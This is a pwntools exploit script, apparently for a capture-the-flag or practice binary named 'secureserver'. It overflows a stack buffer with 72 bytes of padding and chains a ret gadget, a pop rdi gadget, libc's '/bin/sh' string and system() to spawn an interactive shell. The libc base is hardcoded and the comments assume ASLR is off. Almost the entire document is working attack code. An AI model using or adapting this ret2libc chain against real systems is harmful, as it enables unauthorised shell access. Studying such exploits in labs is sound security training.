#!/usr/bin/env python3

from pwn import *
# aslr_off, turn of aslr for this
exe = './secureserver'

elf = context.binary = ELF(exe, checksec=False)

context.log_level='debug'

padding = 72

io = process(exe)

lib_c_base = 0x00007ffff7dbc000 # this will change, dont forget to turn of aslr

system = lib_c_base + 0x4c920  # can remove extra 0, we added context.binary so machine will figure out the size of address needed
binsh = lib_c_base + 0x19604f

ret = 0x401016

#pop rdi gadget found with ropper
pop_rdi = 0x40120b  # can remove extra 0 coz machine will figure it out itself since we are using context.binary

payload = flat(
    asm('nop') * padding,  # padding before EIP
    p64(ret), # for stack alignment
    pop_rdi, # pop the following address into rdi register
    binsh, #address of /bin/sh in libc
    system, #address of system function in libc
    elf.symbols.main # return address of system() function
)

write("payload",payload)

io.sendlineafter(b':',payload)

io.interactive()

#print(io.recvall().decode('latin-1'))
